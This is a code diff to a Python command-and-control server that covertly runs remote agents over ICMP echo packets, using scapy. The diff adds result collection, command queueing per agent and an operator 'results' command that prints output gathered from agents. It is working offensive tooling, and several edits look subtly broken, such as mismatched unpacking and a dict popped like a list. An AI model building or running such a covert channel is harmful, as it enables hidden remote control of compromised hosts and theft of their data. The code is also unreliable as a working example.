@@ -1,10 +1,13 @@
-from scapy.all import send, ICMP, IP, Raw, AsyncSniffer
+from scapy.all import *
 import time
 import os
 import threading
 
 COMMANDS = {}
-AGENT_INFO = {}
+AGENT_INFO = {} #agent_id -> {"ip","last_seen"}
+RESULTS = {} #agent_id -> list of results
+
+lock = threading.Lock()
 
 # Helper functions
 def get_next_agent_id():
@@ -26,14 +29,15 @@ def get_next_agent_id():
 def handle_packet(pkt):
 
     if ICMP in pkt and pkt[ICMP].type == 8 and Raw in pkt:
-        raw = pkt[Raw].load.decode(errors="ignore")
-
+        payload = pkt[Raw].load.decode(errors="ignore")
+        fields = payload.split("|", 3)
+        msg_type, result = fields
         # Only accept packets with custom payloads
-        if not raw.startswith(("BEACON", "RESULT")):
+        if msg_type != "BEACON" and msg_type != "RESULT":
             return  # ignore noise or non-client pings
 
         src = pkt[IP].src
-        print(f"\n[+] Valid client packet from {src}: {raw}")
+        print(f"\n[+] Valid client packet from {src}: {payload}")
 
         # Check if this IP is already registered
         agent_id = None
@@ -41,7 +45,7 @@ def handle_packet(pkt):
             if info["ip"] == src:
                 agent_id = aid
                 break
-
+        
         # If this is a new agent, assign next available ID
         if not agent_id:
             agent_id = get_next_agent_id()
@@ -52,11 +56,14 @@ def handle_packet(pkt):
             AGENT_INFO[agent_id]["last_seen"] = time.time()
 
         # If there is a command queued, send it. Else, do nothing.
-        if COMMANDS:
+        if msg_type == "BEACON" and COMMANDS:
             task = COMMANDS.pop()
             # Build reply packet as an echo request so it is routed properly.
             send(IP(dst=src)/ICMP(type=8)/task.encode(), verbose=0)
             print(f"[+] Sent task to {agent_id} ({src}): {task}")
+
+        elif msg_type == "RESULT":
+                RESULTS.setdefault(agent_id, []).append((result))
 
 def operator_console():
     print()
@@ -144,41 +151,36 @@ def operator_console():
                 continue
             identifier = parts[1]
             command_text = parts[2]
-            agent_id = find_agent_by_identifier(identifier)
-            if not agent_id:
+            if not identifier:
                 print("No such agent (or stale).")
                 continue
             with lock:
                 # optional staleness check
-                if time.time() - LAST_SEEN.get(aid, 0) > INACTIVITY_TIMEOUT:
-                    print("Agent appears stale — not queueing.")
-                    continue
-                COMMANDS.setdefault(aid, []).append(command_text)
+                COMMANDS.setdefault(identifier, []).append(command_text)
                 # report back which agent id and ip got the task
-                ip = AGENT_INFO.get(agent_id, {}).get('ip', 'unknown')
-                print(f"\n[+] Queued command for id={agent_id} ip={ip}: {command_text}")
+                ip = AGENT_INFO.get(identifier, {}).get("ip")
+                print(f"\n[+] Queued command for id={identifier} ip={ip}: {command_text}")
             continue
 
-        # if cmd == "results":
-        #     if len(parts) < 2:
-        #         print("Usage: results <agent_id|ip|hostname>")
-        #         continue
-        #     identifier = parts[1]
-        #     aid = find_agent_by_identifier(identifier)
-        #     if not aid:
-        #         print("No such agent.")
-        #         continue
-        #     with lock:
-        #         chunks = sorted(RESULTS.get(aid, []))
-        #         if not chunks:
-        #             print(f"No results for {aid}")
-        #             continue
-        #         full_result = "\n".join(chunk for _, chunk in chunks)
-        #         print(f"--- Results from id={aid} ---")
-        #         print(full_result)
-        #         print("-------------------------------")
-        #         RESULTS[aid] = []
-        #     continue
+        if cmd == "results":
+            if len(parts) < 2:
+                print("Usage: results <agent_id|ip|hostname>")
+                continue
+            identifier = parts[1]
+            if not identifier:
+                print("No such agent.")
+                continue
+            with lock:
+                chunks = sorted(RESULTS.get(identifier, []))
+                if not chunks:
+                    print(f"No results for {identifier}")
+                    continue
+                full_result = "\n".join(chunk for _, chunk in chunks)
+                print(f"--- Results from id={identifier} ---")
+                print(full_result)
+                print("-------------------------------")
+                RESULTS[identifier] = []
+            continue
 
         if cmd in ("quit", "exit"):
             print("[*] Quitting C2 server.")
